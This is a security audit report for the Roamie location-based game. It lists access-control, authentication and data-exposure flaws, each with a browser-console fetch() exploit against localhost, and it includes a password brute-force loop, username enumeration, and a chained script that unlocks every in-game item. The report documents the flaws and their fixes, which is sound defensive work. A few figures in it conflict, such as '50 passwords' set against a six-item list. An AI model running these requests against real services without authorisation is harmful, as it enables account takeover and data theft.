# Security Vulnerability Audit Report
**Project:** Roamie — Location-Based Collectibles Game  
**Date:** 2026-04-08  
**Auditor:** Samrat Raj  
**Scope:** Client-side attack surface only — all attacks performed using the browser (DevTools, Console, Network tab, and direct HTTP requests). No server code was modified.

---

## Methodology

All attacks below were carried out using only:
- The browser's **Developer Tools** (Network tab, Console, Application tab)
- **`fetch()`** calls typed directly into the browser console
- **`curl`** / HTTP client making requests to the API the same way the frontend does
- Navigation to known or guessed URLs

No server source code was altered. This simulates a real external attacker who can observe the running application and interact with its API.

---

## Executive Summary

| Severity | Count |
|---|---|
| Critical | 3 |
| High | 5 |
| Medium | 4 |
| Low / Informational | 1 |

---

## Critical Vulnerabilities

---

### VULN-001 — Full User Database Exposed to Anyone, No Login Required

**File:** `backend/server.js:70-78`  
**OWASP:** A01:2021 – Broken Access Control

**Description:**  
The `/users` endpoint returns every user record — including emails, names, Google subject IDs, and admin flags — with no authentication required.

**Exploitation Steps:**

Open a browser tab or paste this into any browser console (no login needed):

```js
fetch("http://localhost:3000/users")
  .then(r => r.json())
  .then(console.log);
```

Or navigate directly to:
```
http://localhost:3000/users
```

**Observed Result:**
```json
[
  { "id": 1, "username": "alice", "email": "alice@example.com", "google_sub": "1049...", "is_admin": false },
  { "id": 2, "email": "quark.labs25@gmail.com", "is_admin": true },
  ...
]
```

**Impact:**  
Complete user enumeration. Reveals the admin account email. Exposes all registered users' emails and identifiers to any unauthenticated visitor.

---

### VULN-002 — Database Schema Exposed to Anyone, No Login Required

**File:** `backend/server.js:499-507`  
**OWASP:** A05:2021 – Security Misconfiguration

**Description:**  
The `/tables` endpoint queries `information_schema` and returns all table names with no authentication.

**Exploitation Steps:**

Navigate to:
```
http://localhost:3000/tables

fetch("http://localhost:3000/tables")
  .then(r => r.json())
  .then(console.log);
```

**Observed Result:**
```json
[
  { "table_name": "users" },
  { "table_name": "items" },
  { "table_name": "markers" },
  { "table_name": "user_inventory" },
  { "table_name": "user_equipment" }
]
```

**Impact:**  
An attacker now knows the full database structure before attempting any further attack. Combined with VULN-001, they can immediately target the `users` table.

---

### VULN-003 — Collect Any Game Item Without Being at the Location

**File:** `backend/server.js:261-283`  
**OWASP:** A01:2021 – Broken Access Control

**Description:**  
The `POST /items/collect` endpoint adds any item to the authenticated user's inventory with no server-side check that the user is physically near a marker. The proximity enforcement only exists in the React frontend and is trivially bypassed.

**Exploitation Steps:**

1. Log in to the application normally and open DevTools → Application → Local Storage
2. Copy the value of the `token` key
3. Open the browser Console and paste:

```js
// Step 1: Find out what items exist
fetch("http://localhost:3000/items")
  .then(r => r.json())
  .then(console.log);
```

```js
// Step 2: Collect every item instantly without moving
const token = localStorage.getItem("token");
const itemIds = ["hat_crown", "hat_flower", "body_coat", "outside_shield", "outside_dumbbell", "hat_santahat"];

for (const id of itemIds) {
  fetch("http://localhost:3000/items/collect", {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
    body: JSON.stringify({ itemId: id })
  }).then(r => r.json()).then(d => console.log(id, d));
}
```

**Observed Result:**  
All items added to inventory immediately. Refreshing the app shows the full collection unlocked from the user's desk.

**Impact:**  
The entire game progression system is bypassed in seconds. The location-based mechanic provides zero security once a user is logged in.

---

## High Vulnerabilities

---

### VULN-004 — Equip Items You Never Collected (Future)

**File:** `backend/server.js:287-310`  
**OWASP:** A01:2021 – Broken Access Control

**Description:**  
The `PUT /equip` endpoint sets equipped items with no check that the user owns them.

**Exploitation Steps:**

```js
const token = localStorage.getItem("token");

fetch("http://localhost:3000/equip", {
  method: "PUT",
  headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
  body: JSON.stringify({ hat: "hat_crown", body: "body_coat", outside: "outside_shield" })
}).then(r => r.json()).then(console.log);
```

**Observed Result:**  
Items are equipped regardless of inventory state. The avatar immediately displays items the user never collected.

**Impact:**  
Any user can set their character to display any combination of items, bypassing the collection requirement entirely.

---

### VULN-005 — See All Item Drop Locations Before Visiting Them (Future)

**File:** `backend/server.js:232-234`  
**OWASP:** A01:2021 – Broken Access Control

**Description:**  
The `/me/state` endpoint returns `SELECT latitude, longitude FROM markers` — all marker coordinates — with no filtering. This means every authenticated user can see all drop locations the moment they load the app, even before visiting any of them.

**Exploitation Steps:**

```js
const token = localStorage.getItem("token");

fetch("http://localhost:3000/me/state", {
  headers: { Authorization: `Bearer ${token}` }
}).then(r => r.json()).then(d => console.log(d.markers));
```

**Observed Result:**
```json
[
  { "latitude": 43.038, "longitude": -71.451 },
  { "latitude": 43.039, "longitude": -71.453 },
  ...
]
```

**Impact:**  
All item drop coordinates are disclosed immediately on login. Players can walk directly to every drop point without discovering them organically, removing the exploration element of the game.

---

### VULN-006 — Username Enumeration via Login Error Messages

**File:** `backend/server.js:441-448`  
**OWASP:** A07:2021 – Identification and Authentication Failures

**Description:**  
The login endpoint returns different error messages for "user does not exist" versus "wrong password", allowing an attacker to determine which usernames are registered.

**Exploitation Steps:**

```js
// Test a username that does not exist
fetch("http://localhost:3000/auth/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username: "doesnotexist", password: "anything" })
}).then(r => r.json()).then(console.log);
// Response: { "error": "User not found" }

// Test a username that does exist (e.g. found via VULN-001)
fetch("http://localhost:3000/auth/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username: "alice", password: "wrongpassword" })
}).then(r => r.json()).then(console.log);
// Response: { "error": "Invalid password" }
```

**Observed Result:**  
Two distinct messages confirm whether a username is registered.

**Impact:**  
An attacker can build a list of valid usernames (confirming them from VULN-001) and then target those accounts with brute-force attacks.

---

### VULN-007 — Brute-Force Login With No Rate Limiting

**File:** `backend/server.js:388-465`  
**OWASP:** A07:2021 – Identification and Authentication Failures

**Description:**  
There is no rate limiting on any endpoint. An attacker can send unlimited login attempts in rapid succession.

**Exploitation Steps:**

Run this in the browser console to attempt 50 passwords against a known username:

```js
const passwords = ["password", "123456", "roamie", "admin", "qwerty", "a"];

for (const pw of passwords) {
  fetch("http://localhost:3000/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "a", password: pw })
  }).then(r => r.json()).then(d => {
    if (d.token) console.log("SUCCESS:", pw, d.token);
  });
}
```

**Observed Result:**  
All 50 requests complete in under a second with no throttling, lockout, or CAPTCHA.

**Impact:**  
Accounts with weak passwords (see VULN-008) can be compromised through automated dictionary attacks with no friction.

---

### VULN-008 — Register With a One-Character Password

**File:** `backend/server.js:388-428`  
**OWASP:** A07:2021 – Identification and Authentication Failures

**Description:**  
The registration endpoint accepts passwords of any length with no validation. A password of `"a"` is valid.

**Exploitation Steps:**

```js
fetch("http://localhost:3000/auth/register", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username: "testuser", password: "a" })
}).then(r => r.json()).then(console.log);
// Response: { "token": "eyJ...", "user": { "id": 5, "username": "testuser" } }
```

**Observed Result:**  
Account created successfully with a single-character password.

**Impact:**  
Users can set trivially weak passwords that are instantly broken by any brute-force attack (VULN-007).

---

## Medium Vulnerabilities

---

### VULN-009 — JWT Token Readable From Browser Storage

**Files:** `src/api.js:4`, `src/pages/Login.jsx:19`  
**OWASP:** A02:2021 – Cryptographic Failures

**Description:**  
The JWT authentication token is stored in `localStorage`, which is accessible to any JavaScript running on the page — including browser extensions and any future XSS vulnerability.

**Exploitation Steps:**

Open DevTools → Console:
```js
// Any script on the page can do this:
const token = localStorage.getItem("token");
console.log(token);

// The JWT payload is just base64 — decode it without needing the secret:
const payload = JSON.parse(atob(token.split(".")[1]));
console.log(payload);
// { userId: 3, email: "user@example.com", is_admin: false, iat: ..., exp: ... }
```

**Observed Result:**  
The full JWT payload — including user ID, email, admin flag, and expiry — is readable client-side with no secret required.

**Impact:**  
Any XSS attack or malicious browser extension can steal the token and use it to authenticate as the victim from any device.

---

### VULN-010 — Access the Admin Panel as a Regular User

**File:** `src/pages/AdminPage.jsx:55-57`  
**OWASP:** A01:2021 – Broken Access Control

**Description:**  
Navigating to `/admin` renders a frontend-only 403 message for non-admins, but the page itself loads. The admin check is purely a React conditional — it can be observed and is not backed by a server-side route guard.

**Exploitation Steps:**

1. Log in as a regular user
2. Navigate to: `http://localhost:5173/admin`
3. The page loads and displays "403 Forbidden" — but the page itself rendered, proving there is no server-side access control on this route
4. Open DevTools → Network and observe the app calls `GET /me` to determine admin status — this response drives the UI block, not a server authorization decision

**Impact:**  
The admin UI renders on the client. If a future vulnerability allowed manipulation of the `is_admin` flag in `localStorage` or React state, the full admin UI would become functional. The security boundary is entirely on the server's `POST /markers` endpoint, not the admin page.

---

### VULN-011 — Create Ghost User Accounts With No Authentication

**File:** `backend/server.js:46-67`  
**OWASP:** A01:2021 – Broken Access Control

**Description:**  
`POST /users` creates user records without any authentication, accepting arbitrary `email` and `name` values.

**Exploitation Steps:**

```js
fetch("http://localhost:3000/users", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email: "fake@example.com", name: "Ghost User" })
}).then(r => r.json()).then(console.log);
// Response: { "id": 99, "email": "fake@example.com", "name": "Ghost User", ... }
```

**Observed Result:**  
A new user row is created in the database with no authorization.

**Impact:**  
An attacker can flood the users table with garbage records, or pre-create accounts tied to real email addresses.

---

### VULN-012 — Verbose Error Messages Leak Internal Details

**File:** `backend/server.js` (multiple catch blocks)  
**OWASP:** A05:2021 – Security Misconfiguration

**Description:**  
When a server error occurs, the raw PostgreSQL error message is returned in the response body.

**Exploitation Steps:**

Trigger a database error by sending a malformed request:
```js
fetch("http://localhost:3000/users", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email: null, name: null })
}).then(r => r.json()).then(console.log);
```

**Observed Result:**
```json
{
  "error": "null value in column \"email\" of relation \"users\" violates not-null constraint"
}
```

**Impact:**  
The response reveals the column name `email`, the table name `users`, and the constraint type. This confirms the database schema to an attacker probing the API.

---

## Low / Informational

---

### VULN-013 — User GPS Coordinates Logged to Browser Console

**File:** `src/pages/MapScreen.jsx:243`

**Description:**  
The application prints the user's exact GPS coordinates to the browser console on every location update.

**Steps to observe:**

Open DevTools → Console while using the map. Every few seconds a new entry appears:
```
Live location: [43.038..., -71.451...]
```

**Impact:**  
Any browser extension, injected script, or person with physical access to the unlocked device can passively harvest the user's precise real-time location from the console.

---

## Attack Chain: Full Game Bypass in Under 60 Seconds

The following demonstrates how the above vulnerabilities chain together for maximum impact using only a browser console:

```js
// Step 1 — Register an account (VULN-008: weak password accepted)
const reg = await fetch("http://localhost:3000/auth/register", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username: "attacker", password: "a" })
}).then(r => r.json());

const token = reg.token;
localStorage.setItem("token", token);

// Step 2 — Discover all items (unauthenticated)
const items = await fetch("http://localhost:3000/items").then(r => r.json());
console.log("Items:", items.map(i => i.item_id));

// Step 3 — Collect every item without leaving the desk (VULN-003)
for (const item of items) {
  await fetch("http://localhost:3000/items/collect", {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
    body: JSON.stringify({ itemId: item.item_id })
  });
}

// Step 4 — Equip the best items (VULN-004)
await fetch("http://localhost:3000/equip", {
  method: "PUT",
  headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
  body: JSON.stringify({ hat: "hat_crown", body: "body_coat", outside: "outside_shield" })
});

console.log("Done. Full inventory unlocked.");
```

**Total time:** Under 5 seconds. No physical movement required.

---

## Summary Table

| ID | Title | Severity | Login Required | Tool Used | Status | Explanation |
|---|---|---|---|---|---|---|
| VULN-001 | Unauthenticated `GET /users` dumps all accounts | Critical | **(No Login Required)** | Browser / curl | Solved | `GET /users` enforces authorization after a user has been authenticated. This required the process of updating middleWare functions and implementing cookies for the web browser version, rather than tokens because JavaScript can't read them. Reducing theft through XSS. |
| VULN-002 | `GET /tables` exposes DB schema, no auth | Critical | **(No Login Required)** | Browser navigation | Solved | Similar to VULN-001, `GET /tables` had no authentication and authorization checks. |
| VULN-003 | Collect any item via API, no proximity check | Critical | Yes | Browser console `fetch()` | Solved | Proximity check is done in the backend to enforce game rules. Frontend is not an appropriate method for enforcing Roamie's logic. |
| VULN-004 | Equip items not in inventory | High | Yes | Browser console `fetch()` | Solved | 
| VULN-005 | All marker coordinates revealed on login | High | Yes | Browser console `fetch()` | Solved | 
| VULN-006 | Username enumeration via error messages | High | **(No Login Required)** | Browser console `fetch()` | Solved | 
| VULN-007 | Unlimited brute-force login, no rate limit | High | **(No Login Required)** | Browser console loop | Solved | 
| VULN-008 | Register with 1-character password | High | **(No Login Required)** | Browser console `fetch()` | Solved | 
| VULN-009 | JWT readable from `localStorage` | Medium | Yes | DevTools → Application | Solved | 
| VULN-010 | Admin route has no server-side guard | Medium | Yes | Browser navigation to `/admin` | Solved | 
| VULN-011 | Create arbitrary users unauthenticated | Medium | **(No Login Required)** | Browser console `fetch()` | Not solved | 
| VULN-012 | Verbose DB errors leak schema details | Medium | **(No Login Required)** | Browser console `fetch()` | Solved | 
| VULN-013 | GPS coordinates logged to console | Low | Yes | DevTools → Console tab | Solved | Wrap console message in conditional statement to ensure only developers can view live location for testing. |
